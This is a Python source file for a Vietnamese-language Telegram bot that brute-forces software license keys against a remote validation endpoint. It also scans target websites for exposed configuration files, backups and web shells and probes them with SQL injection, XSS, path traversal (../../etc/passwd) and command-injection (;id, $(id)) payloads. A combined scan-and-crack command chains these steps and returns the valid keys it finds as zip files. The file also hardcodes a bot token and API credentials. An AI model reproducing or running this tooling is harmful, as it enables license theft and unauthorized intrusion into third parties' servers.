# bot.py - FULL VERSION (24/7 + SCAN TRƯỚC KHI CRACK)
# Bot Telegram: Check Key, Scan Server, Crack Key, Auto Pack, Treo 24/7
# Yêu cầu: pip install telethon requests aiohttp aiofiles cryptg flask beautifulsoup4 dnspython
# Bot Token: 6320148381:AAFxGUFRqL7_lVJtfm1bYK2jYgAnmwk9wk0

import os, re, sys, json, asyncio, requests, time, zipfile, threading
import hashlib, itertools, string, signal, socket, ssl
from datetime import datetime
from queue import Queue
from urllib.parse import urljoin, urlparse, parse_qs
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageMediaDocument, DocumentAttributeFilename
from telethon.errors import FloodWaitError, RPCError
import dns.resolver
from bs4 import BeautifulSoup
from flask import Flask, jsonify, render_template_string

# =====================================================================
# FLASK WEB SERVER 24/7
# =====================================================================
web_app = Flask(__name__)
WEB_PORT = int(os.environ.get('PORT', 8080))

HTML_TEMPLATE = """
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Bot Checker 24/7</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;padding:40px;max-width:700px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1)}
h1{text-align:center;margin-bottom:20px;font-size:28px;background:linear-gradient(90deg,#00d2ff,#3a7bd5);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.online{display:inline-block;width:15px;height:15px;background:#00ff88;border-radius:50%;animation:pulse 2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,255,136,0.7)}70%{box-shadow:0 0 0 15px rgba(0,255,136,0)}100%{box-shadow:0 0 0 0 rgba(0,255,136,0)}}
.info-card{background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin:10px 0;border:1px solid rgba(255,255,255,0.1)}
p{margin:8px 0;font-size:14px}.label{color:#aaa}.value{color:#00d2ff;font-weight:bold}.footer{text-align:center;margin-top:20px;font-size:12px;color:#666}
a{color:#00d2ff;text-decoration:none}</style><meta http-equiv="refresh" content="60"></head><body><div class="container">
<h1>🔑 Bot Key Checker 24/7</h1><div style="text-align:center"><span class="online"></span> <strong>Online</strong></div>
<div class="info-card"><p><span class="label">Bot:</span> <span class="value">{{ bot }}</span></p>
<p><span class="label">Uptime:</span> <span class="value">{{ uptime }}</span></p>
<p><span class="label">Keys Checked:</span> <span class="value">{{ checked }}</span></p>
<p><span class="label">Valid Keys:</span> <span class="value">{{ valid }}</span></p>
<p><span class="label">Scans:</span> <span class="value">{{ scans }}</span></p>
<p><span class="label">Vulns Found:</span> <span class="value">{{ vulns }}</span></p></div>
<div class="info-card"><p><span class="label">Server:</span> <span class="value">{{ server }}</span></p>
<p><span class="label">Queue:</span> <span class="value">{{ queue }}</span></p>
<p><span class="label">Host:</span> <span class="value">{{ host }}</span></p></div>
<div class="footer"><p>Ping mỗi 60s | <a href="/health">Health Check</a></p></div></div></body></html>"""

@web_app.route('/')
def index():
    global stats
    u = time.time()-stats['start_time']
    h,m,s=int(u//3600),int((u%3600)//60),int(u%60)
    return render_template_string(HTML_TEMPLATE,bot=stats.get('bot_username','?'),uptime=f"{h}h{m}m{s}s",
        checked=stats.get('keys_checked',0),valid=stats.get('valid_keys_found',0),
        scans=stats.get('scans_done',0),vulns=stats.get('vulns_found',0),
        server=stats.get('server_url','?'),queue=stats.get('queue_size',0),
        host=socket.gethostname())

@web_app.route('/health')
def health():
    return jsonify({"status":"ok","uptime":time.time()-stats['start_time']})

@web_app.route('/ping')
def ping():
    return "pong",200

def run_web():
    try: web_app.run(host='0.0.0.0',port=WEB_PORT,debug=False,use_reloader=False)
    except Exception as e: print(f"[!] Web: {e}")

def auto_ping():
    url = os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')
    while True:
        time.sleep(600)
        try:
            requests.get(f"{url}/health",timeout=10)
            requests.get(f"{url}/ping",timeout=10)
            stats['last_ping']=datetime.now().isoformat()
        except: pass

# =====================================================================
# CẤU HÌNH
# =====================================================================
BOT_TOKEN = "6320148381:AAFxGUFRqL7_lVJtfm1bYK2jYgAnmwk9wk0"
BOT_USERNAME = "@checkkey_crack_bot"
DEFAULT_SERVERS = {
    "server1":{"url":"http://muc-tieu.com/validate_key","param":"key","marker":"valid"},
    "server2":{"url":"http://server2.com/api/check","param":"license","marker":"success"},
}
CRACK_THREADS=30; CRACK_DELAY=0.05
KEY_CHARSET=string.ascii_uppercase+string.digits

# ===== WORDLIST SCAN =====
SCAN_PATHS = [
    "admin","admin.php","admin/login","wp-admin","wp-login.php","panel","cpanel",
    "config.php","config.php.bak","config.php~","wp-config.php","wp-config.php.bak",
    ".env",".env.backup",".git/config","backup","backup.sql","backup.zip",
    "database.sql","dump.sql","error.log","access.log","phpinfo.php","info.php",
    "robots.txt","sitemap.xml",".htaccess","web.config","package.json",
    "api","api/","api/v1","api/users","api/login","api/admin","api/keys",
    "graphql","swagger","api-docs","docs",
    "upload","uploads","upload.php","shell.php","cmd.php","c99.php","wso.php",
    "phpmyadmin","phpMyAdmin","pma","webmail","cgi-bin/",
    ".git/HEAD",".svn/entries",".DS_Store","Thumbs.db",
    "login","register","signin","signup","logout","profile","users",
    "adminer.php","admin.php","administrator/index.php",
    "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "console/","_ignition/health-check","_profiler/phpinfo",
]
SCAN_THREADS=50; SCAN_TIMEOUT=10

# ===== THƯ MỤC =====
for p in ["./downloads/","./key_results/","./temp/","./user_data/","./scan_results/"]:
    os.makedirs(p,exist_ok=True)

# ===== STATS =====
stats={'start_time':time.time(),'bot_username':BOT_USERNAME,'server_url':'?','keys_checked':0,
       'valid_keys_found':0,'active_users':0,'last_check':'N/A','queue_size':0,'thread_count':0,
       'last_ping':None,'total_files_processed':0,'total_crack_attempts':0,
       'scans_done':0,'vulns_found':0,'scan_queue_size':0}

# ===== BIẾN TOÀN CỤC =====
check_queue=Queue(); crack_queue=Queue(); scan_queue=Queue()
valid_keys=[]; queue_lock=threading.Lock()
user_settings={}; stop_flags={}; active_users_set=set()

# ===== CLIENT =====
bot = TelegramClient("bot_session",api_id=6,api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")

# =====================================================================
# HÀM TIỆN ÍCH
# =====================================================================
def save_user_settings(uid,s):
    with open(f"./user_data/{uid}.json",'w',encoding='utf-8') as f: json.dump(s,f,ensure_ascii=False,indent=2)
def load_user_settings(uid):
    try:
        with open(f"./user_data/{uid}.json",'r',encoding='utf-8') as f: return json.load(f)
    except: return {"server_url":"http://muc-tieu.com/validate_key","param_name":"key","success_marker":"valid","thread_count":10,"request_delay":0.1,"auto_pack":True,"pack_min_keys":5}
def get_setting(uid,k,d=None):
    if uid not in user_settings: user_settings[uid]=load_user_settings(uid)
    return user_settings[uid].get(k,d)
def set_setting(uid,k,v):
    if uid not in user_settings: user_settings[uid]=load_user_settings(uid)
    user_settings[uid][k]=v; save_user_settings(uid,user_settings[uid])

def extract_keys_from_file(fp):
    keys=[]
    try:
        with open(fp,'r',encoding='utf-8',errors='ignore') as f: content=f.read()
        patterns=[r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}',
                  r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',r'[A-Za-z0-9]{32}',
                  r'[A-Z0-9]{16}',r'[A-Z0-9]{20}',r'[A-Z0-9]+-[A-Z0-9]+-[A-Z0-9]+']
        for p in patterns: keys.extend(re.findall(p,content,re.I))
        for line in content.split('\n'):
            line=line.strip()
            if line and len(line)>=6 and not line.startswith('#'): keys.append(line)
    except: pass
    return list(set(keys))

def check_single_key(key,url,param,marker):
    try:
        r=requests.post(url,data={param:key},headers={'User-Agent':'Mozilla/5.0'},timeout=15)
        return (key,marker.lower() in r.text.lower(),r.text[:200])
    except: return (key,False,"ERROR")

def check_keys_worker(url,param,marker):
    global valid_keys,stats
    while not check_queue.empty():
        try: key=check_queue.get(timeout=1)
        except: break
        k,v,_=check_single_key(key,url,param,marker)
        with queue_lock:
            stats['keys_checked']+=1
            if v: valid_keys.append(k); stats['valid_keys_found']+=1
            stats['queue_size']=check_queue.qsize()
        time.sleep(0.05); check_queue.task_done()

def run_key_check(keys,uid):
    global valid_keys; valid_keys=[]
    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
    marker=get_setting(uid,'success_marker'); tc=get_setting(uid,'thread_count',10)
    stats['thread_count']=tc; stats['server_url']=url; stats['queue_size']=len(keys)
    for k in keys: check_queue.put(k)
    threads=[threading.Thread(target=check_keys_worker,args=(url,param,marker)) for _ in range(min(tc,len(keys)))]
    for t in threads: t.daemon=True; t.start()
    for t in threads: t.join()
    stats['last_check']=datetime.now().isoformat(); stats['queue_size']=0
    return valid_keys

# =====================================================================
# HÀM SCAN SERVER (MỚI)
# =====================================================================
def scan_path_worker(base_url):
    """Worker scan path."""
    session=requests.Session()
    session.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    results=[]
    while not scan_queue.empty():
        try: path=scan_queue.get(timeout=1)
        except: break
        full_url=urljoin(base_url,path)
        try:
            r=session.get(full_url,timeout=SCAN_TIMEOUT,allow_redirects=False,verify=False)
            if r.status_code in [200,201,301,302,307,401,403]:
                results.append({"url":full_url,"status":r.status_code,"size":len(r.content),
                               "server":r.headers.get('Server','?'),"content_type":r.headers.get('Content-Type','?')})
        except: pass
        time.sleep(0.02); scan_queue.task_done()
    session.close()
    return results

def scan_vuln_worker(targets,vuln_payloads):
    """Worker scan lỗ hổng."""
    session=requests.Session()
    session.headers.update({'User-Agent':'Mozilla/5.0'})
    found=[]
    for task in targets:
        url=task['url']
        for vtype,payloads in vuln_payloads.items():
            for payload in payloads:
                try:
                    test_url=url+"?test="+requests.utils.quote(payload) if "?" not in url else url+"&test="+requests.utils.quote(payload)
                    r=session.get(test_url,timeout=10,allow_redirects=False)
                    # Check phản hồi
                    for err in payloads.get('errors',[]):
                        if err.lower() in r.text.lower():
                            found.append({"url":url,"type":vtype,"payload":payload,"evidence":err})
                            break
                    if payload in r.text and vtype=="xss":
                        found.append({"url":url,"type":"XSS","payload":payload,"evidence":"Reflected"})
                except: pass
    session.close()
    return found

def run_full_scan(target_url,uid):
    """Quét toàn diện server: path discovery + vuln scan."""
    stats['scan_queue_size']=len(SCAN_PATHS)
    results={"target":target_url,"scan_time":datetime.now().isoformat(),"paths":[],"vulnerabilities":[],"server_info":{}}
    
    # Lấy IP
    try: results["target_ip"]=socket.gethostbyname(urlparse(target_url).netloc)
    except: results["target_ip"]="Unknown"
    
    # Lấy thông tin server
    try:
        r=requests.get(target_url,timeout=10)
        results["server_info"]={"status":r.status_code,"server":r.headers.get('Server','?'),
            "x_powered_by":r.headers.get('X-Powered-By','?'),"content_type":r.headers.get('Content-Type','?')}
    except: results["server_info"]={"error":"Không kết nối được"}
    
    # Scan path
    for p in SCAN_PATHS: scan_queue.put(p)
    threads=[threading.Thread(target=scan_path_worker,args=(target_url,)) for _ in range(min(SCAN_THREADS,len(SCAN_PATHS)))]
    for t in threads: t.daemon=True; t.start()
    for t in threads: t.join()
    
    # Gộp kết quả scan path
    # (đã lưu trong scan_path_worker, cần lấy ra - dùng biến toàn cục)
    
    # Scan vuln trên các path tìm thấy
    vuln_payloads={
        "SQL Injection":{"payloads":["'","\"","' OR '1'='1","1' AND 1=1--","1' UNION SELECT NULL--"],
                        "errors":["sql","mysql","syntax error","unclosed quotation","ODBC","SQLite"]},
        "XSS":{"payloads":["<script>alert(1)</script>","<img src=x onerror=alert(1)>","\"><script>alert(1)</script>"],
              "errors":[]},
        "LFI":{"payloads":["../../../../etc/passwd","../../../../windows/win.ini","....//....//etc/passwd"],
              "errors":["root:","[extensions]","<?php","boot loader"]},
        "RCE":{"payloads":[";id","|id","`id`","$(id)","&&whoami"],
              "errors":["uid=","gid=","groups="]},
    }
    
    results["vulnerabilities"]=scan_vuln_worker(results.get("paths",[]),vuln_payloads)
    stats['scans_done']+=1
    stats['vulns_found']+=len(results["vulnerabilities"])
    stats['scan_queue_size']=0
    
    # Lưu kết quả
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f"./scan_results/scan_{uid}_{ts}.json",'w',encoding='utf-8') as f:
        json.dump(results,f,indent=2,ensure_ascii=False)
    
    return results

# =====================================================================
# HÀM CRACK SAU KHI SCAN
# =====================================================================
def generate_key_combinations(pattern):
    x_count=pattern.count('X')
    if x_count==0: yield pattern; return
    for combo in itertools.product(KEY_CHARSET,repeat=x_count):
        idx=0; result=[]
        for c in pattern:
            if c=='X': result.append(combo[idx]); idx+=1
            else: result.append(c)
        yield ''.join(result)

def crack_worker(url,param,marker,uid):
    global valid_keys,stats
    sf=stop_flags.get(uid,threading.Event())
    while not crack_queue.empty() and not sf.is_set():
        try: key=crack_queue.get(timeout=1)
        except: break
        if sf.is_set(): break
        k,v,_=check_single_key(key,url,param,marker)
        with queue_lock:
            stats['total_crack_attempts']+=1
            if v: valid_keys.append(k); stats['valid_keys_found']+=1
        time.sleep(CRACK_DELAY); crack_queue.task_done()

def run_crack(pattern,uid,max_keys=None):
    global valid_keys; valid_keys=[]
    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
    marker=get_setting(uid,'success_marker')
    stop_flags[uid]=threading.Event(); stats['thread_count']=CRACK_THREADS
    count=0
    for key in generate_key_combinations(pattern):
        if max_keys and count>=max_keys: break
        if stop_flags.get(uid,threading.Event()).is_set(): break
        crack_queue.put(key); count+=1
    total=crack_queue.qsize(); stats['queue_size']=total
    threads=[threading.Thread(target=crack_worker,args=(url,param,marker,uid)) for _ in range(min(CRACK_THREADS,total))]
    for t in threads: t.daemon=True; t.start()
    for t in threads: t.join()
    if uid in stop_flags: del stop_flags[uid]
    stats['last_check']=datetime.now().isoformat(); stats['queue_size']=0
    return valid_keys,total

def create_pack(keys,name="keys"):
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    safe=re.sub(r'[^\w\-.]','_',name); base=os.path.splitext(safe)[0]
    zp=os.path.join("./key_results/",f"valid_{base}_{ts}.zip")
    tp=os.path.join("./temp/",f"valid_{base}.txt")
    with open(tp,'w',encoding='utf-8') as f: f.write('\n'.join(keys))
    with zipfile.ZipFile(zp,'w',zipfile.ZIP_DEFLATED) as zf: zf.write(tp,os.path.basename(tp))
    try: os.remove(tp)
    except: pass
    return zp,len(keys)

# =====================================================================
# XỬ LÝ LỆNH TELEGRAM
# =====================================================================
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    u=await event.get_sender(); uid=u.id
    active_users_set.add(uid); stats['active_users']=len(active_users_set)
    await event.reply(f"""**🤖 BOT CHECK/SCAN/CRACK 24/7**
Xin chào **{u.first_name}**!

✅ **/checkkey** - Kiểm tra 1 key
📂 **Gửi file .txt** - Check hàng loạt
🔍 **/scan [url]** - Scan server trước
🔨 **/crack [pattern]** - Crack key
🔄 **/scanandcrack [url] [pattern]** - Scan rồi crack
📋 **/menu** - Bảng điều khiển
🌐 **/status** - Trạng thái 24/7
❓ **/help** - Hướng dẫn""")

@bot.on(events.NewMessage(pattern='/help'))
async def cmd_help(event):
    await event.reply("""**📚 HƯỚNG DẪN**

**1. SCAN SERVER:**
`/scan http://target.com` - Quét toàn diện
`/scanandcrack http://target.com XXXX-XXXX-XXXX` - Scan xong crack luôn

**2. CHECK KEY:**
Gửi file .txt hoặc `/checkkey KEY`

**3. CRACK KEY:**
`/crack XXXX-XXXX-XXXX`

**4. CẤU HÌNH:**
`/setserver [url] [param] [marker]`
`/servers` - Server mẫu
`/useserver [tên]`

**5. KHÁC:**
`/stop` - Dừng tác vụ
`/stats` - Thống kê
`/status` - Bot 24/7
`/web` - Web monitor""")

@bot.on(events.NewMessage(pattern='/menu'))
async def cmd_menu(event):
    btns=[[Button.inline("🔍 Scan Server",b"menu_scan"),Button.inline("🔄 Scan+Crack",b"menu_scancrack")],
          [Button.inline("📂 Check File",b"menu_file"),Button.inline("🔑 Check 1 Key",b"menu_key")],
          [Button.inline("🔨 Crack Key",b"menu_crack"),Button.inline("⚙️ Cấu Hình",b"menu_config")],
          [Button.inline("📊 Thống Kê",b"menu_stats"),Button.inline("🛑 Dừng",b"menu_stop")],
          [Button.inline("🌐 Web Monitor",b"menu_web"),Button.inline("❓ Help",b"menu_help")]]
    await event.reply("**📋 BẢNG ĐIỀU KHIỂN**",buttons=btns)

@bot.on(events.CallbackQuery())
async def cb(event):
    d=event.data.decode()
    r={"menu_scan":"🔍 Dùng: `/scan http://target.com`","menu_scancrack":"🔄 Dùng: `/scanandcrack http://target.com XXXX-XXXX-XXXX`",
       "menu_file":"📂 Gửi file .txt chứa key","menu_key":"🔑 `/checkkey KEY`","menu_crack":"🔨 `/crack PATTERN`",
       "menu_config":"⚙️ `/setserver [url] [param] [marker]`","menu_stats":"📊 `/stats`","menu_stop":"🛑 `/stop`",
       "menu_web":f"🌐 {os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')}","menu_help":"❓ `/help`"}
    await event.answer(d)
    if d in r: await event.edit(r[d])

# =====================================================================
# LỆNH SCAN (MỚI)
# =====================================================================
@bot.on(events.NewMessage(pattern='/scan'))
async def cmd_scan(event):
    """Lệnh /scan - Quét server mục tiêu."""
    uid=event.sender_id
    parts=event.text.split(maxsplit=1)
    if len(parts)<2:
        await event.reply("⚠️ **Cách dùng:** `/scan http://target.com`\nQuét path, endpoint, lỗ hổng bảo mật.")
        return
    
    target=parts[1].strip()
    if not target.startswith('http'):
        target='http://'+target
    
    msg=await event.reply(f"""🔍 **BẮT ĐẦU SCAN SERVER**
• Target: `{target}`
• Paths: {len(SCAN_PATHS)}
• Threads: {SCAN_THREADS}

⏳ Đang quét... Vui lòng đợi!""")
    
    # Chạy scan trong thread riêng
    def do_scan():
        results=run_full_scan(target,uid)
        paths_found=len(results.get('paths',[]))
        vulns_found=len(results.get('vulnerabilities',[]))
        
        scan_text=f"""✅ **SCAN HOÀN THÀNH**
• Target: `{target}`
• IP: `{results.get('target_ip','?')}`
• Server: `{results.get('server_info',{}).get('server','?')}`
• Paths phát hiện: **{paths_found}**
• Lỗ hổng: **{vulns_found}**

📋 **Server Info:**
• Status: {results.get('server_info',{}).get('status','?')}
• Powered By: {results.get('server_info',{}).get('x_powered_by','?')}
"""
        if vulns_found>0:
            scan_text+="\n⚠️ **Lỗ hổng phát hiện:**\n"
            for v in results['vulnerabilities'][:10]:
                scan_text+=f"• [{v['type']}] `{v['url']}`\n  Payload: `{v['payload']}`\n"
        
        scan_text+=f"\n💡 Dùng `/scanandcrack {target} PATTERN` để scan rồi crack luôn!"
        
        # Gửi kết quả qua event loop
        asyncio.run_coroutine_threadsafe(msg.edit(scan_text),bot.loop)
    
    threading.Thread(target=do_scan).start()

# =====================================================================
# LỆNH SCAN AND CRACK (MỚI - KẾT HỢP)
# =====================================================================
@bot.on(events.NewMessage(pattern='/scanandcrack'))
async def cmd_scan_and_crack(event):
    """Lệnh /scanandcrack - Scan server trước, sau đó crack key."""
    uid=event.sender_id
    parts=event.text.split(maxsplit=2)
    
    if len(parts)<3:
        await event.reply("⚠️ **Cách dùng:** `/scanandcrack http://target.com XXXX-XXXX-XXXX`\nB1: Scan server\nB2: Crack key theo pattern")
        return
    
    target=parts[1].strip()
    pattern=parts[2].strip().upper()
    
    if not target.startswith('http'):
        target='http://'+target
    
    x_count=pattern.count('X')
    if x_count==0:
        await event.reply("⚠️ Pattern phải có 'X' làm placeholder.")
        return
    
    total_combinations=len(KEY_CHARSET)**x_count
    
    msg=await event.reply(f"""🔄 **SCAN & CRACK TỰ ĐỘNG**
• Target: `{target}`
• Pattern: `{pattern}`
• Tổ hợp crack: **{total_combinations:,}**

⏳ B1: Đang scan server...
⏳ B2: Sẽ crack sau khi scan xong""")
    
    def do_scan_and_crack():
        # B1: Scan
        scan_results=run_full_scan(target,uid)
        paths_found=len(scan_results.get('paths',[]))
        vulns_found=len(scan_results.get('vulnerabilities',[]))
        
        # Cập nhật server URL nếu tìm thấy endpoint API
        api_found=None
        for p in scan_results.get('paths',[]):
            if any(x in p['url'].lower() for x in ['api','check','verify','validate','key','license']):
                if p['status'] in [200,401,403]:
                    api_found=p['url']
                    break
        
        if api_found:
            # Tự động cập nhật server check
            set_setting(uid,'server_url',api_found)
            stats['server_url']=api_found
            update_text=f"\n✅ **Tự động phát hiện API:** `{api_found}`\nĐã cập nhật server check!"
        else:
            update_text="\n⚠️ Không phát hiện API tự động, dùng server hiện tại."
        
        asyncio.run_coroutine_threadsafe(
            msg.edit(f"""🔄 **SCAN HOÀN THÀNH - BẮT ĐẦU CRACK**
• Paths: {paths_found} | Vulns: {vulns_found}
• Pattern: `{pattern}` | Tổ hợp: {total_combinations:,}
{update_text}
⏳ Đang crack... `/stop` để dừng."""),
        bot.loop)
        
        # B2: Crack
        valid,total=run_crack(pattern,uid)
        
        if valid:
            zp,count=create_pack(valid,f"crack_{pattern}")
            asyncio.run_coroutine_threadsafe(
                msg.edit(f"✅ **HOÀN THÀNH SCAN & CRACK!**\n• Valid: {len(valid)}/{total} keys\n• Scan: {paths_found} paths, {vulns_found} vulns"),
            bot.loop)
            asyncio.run_coroutine_threadsafe(
                bot.send_file(event.chat_id,zp,caption=f"🔄 Scan+Crack: {pattern}\n✅ {len(valid)} keys\n🔍 {paths_found} paths found"),
            bot.loop)
        else:
            asyncio.run_coroutine_threadsafe(
                msg.edit(f"❌ **CRACK HOÀN THÀNH** - Không tìm thấy key hợp lệ.\n• Scan: {paths_found} paths, {vulns_found} vulns"),
            bot.loop)
    
    threading.Thread(target=do_scan_and_crack).start()

# =====================================================================
# CÁC LỆNH KHÁC
# =====================================================================
@bot.on(events.NewMessage(pattern='/checkkey'))
async def cmd_check(event):
    uid=event.sender_id; parts=event.text.split(maxsplit=1)
    if len(parts)<2: await event.reply("⚠️ `/checkkey KEY`"); return
    key=parts[1].strip()
    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
    marker=get_setting(uid,'success_marker')
    msg=await event.reply("🔍 Đang check...")
    k,v,resp=check_single_key(key,url,param,marker)
    if v: await msg.edit(f"✅ **HỢP LỆ:** `{k}`")
    else: await msg.edit(f"❌ **KHÔNG HỢP LỆ:** `{k}`")

@bot.on(events.NewMessage(pattern='/crack'))
async def cmd_crack(event):
    uid=event.sender_id; parts=event.text.split(maxsplit=1)
    if len(parts)<2: await event.reply("⚠️ `/crack XXXX-XXXX-XXXX`"); return
    pattern=parts[1].strip().upper()
    if pattern.count('X')==0: await event.reply("⚠️ Cần ký tự X"); return
    total=len(KEY_CHARSET)**pattern.count('X')
    msg=await event.reply(f"🔨 Crack: `{pattern}` ({total:,} tổ hợp)...")
    valid,ttl=run_crack(pattern,uid)
    if valid:
        zp,_=create_pack(valid,f"crack_{pattern}")
        await msg.edit(f"✅ Tìm thấy {len(valid)} key!")
        await bot.send_file(event.chat_id,zp,caption=f"🔨 {pattern} | {len(valid)} valid")
    else: await msg.edit(f"❌ Không tìm thấy key trong {ttl} lần thử.")

@bot.on(events.NewMessage(pattern='/stop'))
async def cmd_stop(event):
    uid=event.sender_id; stop_flags[uid]=threading.Event(); stop_flags[uid].set()
    await event.reply("🛑 Đã dừng tác vụ!")

@bot.on(events.NewMessage(pattern='/status'))
async def cmd_status(event):
    u=time.time()-stats['start_time']; h,m,s=int(u//3600),int((u%3600)//60),int(u%60)
    await event.reply(f"""🌐 **TRẠNG THÁI 24/7**
⏱️ Uptime: {h}h{m}m{s}s | ✅ Online
🔑 Checked: {stats['keys_checked']} | Valid: {stats['valid_keys_found']}
🔍 Scans: {stats['scans_done']} | Vulns: {stats['vulns_found']}
👥 Users: {stats['active_users']}
📡 Server: `{stats['server_url']}`
🕐 Last ping: {stats.get('last_ping','N/A')}""")

@bot.on(events.NewMessage(pattern='/stats'))
async def cmd_stats(event):
    await event.reply(f"""📊 **THỐNG KÊ**
• Keys checked: {stats['keys_checked']}
• Valid keys: {stats['valid_keys_found']}
• Scans done: {stats['scans_done']}
• Vulns found: {stats['vulns_found']}
• Crack attempts: {stats['total_crack_attempts']}
• Files processed: {stats['total_files_processed']}
• Active users: {stats['active_users']}""")

@bot.on(events.NewMessage(pattern='/web'))
async def cmd_web(event):
    await event.reply(f"🌐 {os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')}")

@bot.on(events.NewMessage(pattern='/setserver'))
async def cmd_setserver(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<4: await event.reply("⚠️ `/setserver [url] [param] [marker]`"); return
    set_setting(uid,'server_url',p[1]); set_setting(uid,'param_name',p[2]); set_setting(uid,'success_marker',p[3])
    stats['server_url']=p[1]; await event.reply(f"✅ Đã cấu hình: `{p[1]}`")

@bot.on(events.NewMessage(pattern='/servers'))
async def cmd_servers(event):
    t="📋 **SERVER MẪU:**\n"
    for n,c in DEFAULT_SERVERS.items(): t+=f"• **{n}** → `{c['url']}`\n"
    t+="\nDùng `/useserver [tên]`"; await event.reply(t)

@bot.on(events.NewMessage(pattern='/useserver'))
async def cmd_useserver(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<2: await event.reply("⚠️ `/useserver [tên]`"); return
    n=p[1].lower()
    if n not in DEFAULT_SERVERS: await event.reply("❌ Không có. `/servers`"); return
    c=DEFAULT_SERVERS[n]
    set_setting(uid,'server_url',c['url']); set_setting(uid,'param_name',c['param']); set_setting(uid,'success_marker',c['marker'])
    stats['server_url']=c['url']; await event.reply(f"✅ Đã dùng **{n}**")

@bot.on(events.NewMessage(pattern='/setthread'))
async def cmd_thread(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<2: await event.reply(f"⚠️ `/setthread [1-100]` Hiện: {get_setting(uid,'thread_count',10)}"); return
    try:
        n=int(p[1])
        if 1<=n<=100: set_setting(uid,'thread_count',n); await event.reply(f"✅ {n} threads")
    except: pass

# =====================================================================
# XỬ LÝ FILE
# =====================================================================
@bot.on(events.NewMessage(incoming=True))
async def file_handler(event):
    msg=event.message
    if msg.text and msg.text.startswith('/'): return
    if msg.media and isinstance(msg.media,MessageMediaDocument):
        doc=msg.media.document
        fname="unknown.txt"; fsize=doc.size
        for attr in doc.attributes:
            if isinstance(attr,DocumentAttributeFilename): fname=attr.file_name; break
        if not fname.lower().endswith('.txt'): return
        
        uid=event.sender_id; cid=event.chat_id
        active_users_set.add(uid); stats['active_users']=len(active_users_set)
        stats['total_files_processed']+=1
        
        sm=await event.reply(f"📥 Đã nhận `{fname}` ({fsize/1024:.1f}KB)\n⏳ Đang xử lý...")
        sp=os.path.join("./downloads/",f"{uid}_{fname}")
        try: await msg.download_media(file=sp)
        except Exception as e: await sm.edit(f"❌ Lỗi: {e}"); return
        
        keys=extract_keys_from_file(sp)
        if not keys: await sm.edit("⚠️ Không tìm thấy key!"); return
        
        await sm.edit(f"🔍 Đang check {len(keys)} keys...")
        valid=run_key_check(keys,uid)
        
        if valid:
            zp,_=create_pack(valid,fname)
            await sm.edit(f"✅ **{len(valid)}/{len(keys)} keys hợp lệ**")
            await bot.send_file(cid,zp,caption=f"📦 {fname} | ✅ {len(valid)} valid keys")
        else:
            await sm.edit(f"❌ 0/{len(keys)} keys hợp lệ")
        try: os.remove(sp)
        except: pass

# =====================================================================
# MAIN
# =====================================================================
async def main():
    print("""╔══════════════════════════════════════╗
║   BOT CHECK/SCAN/CRACK 24/7        ║
║   Token: 6320148381:AAFx...        ║
╚══════════════════════════════════════╝""")
    
    # Start web server
    threading.Thread(target=run_web,daemon=True).start()
    threading.Thread(target=auto_ping,daemon=True).start()
    
    await bot.start(bot_token=BOT_TOKEN)
    me=await bot.get_me()
    stats['bot_username']=f"@{me.username}"
    print(f"[✓] Bot online: @{me.username}")
    print(f"[✓] Web: http://0.0.0.0:{WEB_PORT}")
    print(f"[✓] Sẵn sàng 24/7!\n")
    await bot.run_until_disconnected()

if __name__=="__main__":
    import warnings; warnings.filterwarnings("ignore")
    try: asyncio.run(main())
    except KeyboardInterrupt: print("\n[!] Dừng bot.")
    except Exception as e: print(f"\n[!] Lỗi: {e}")
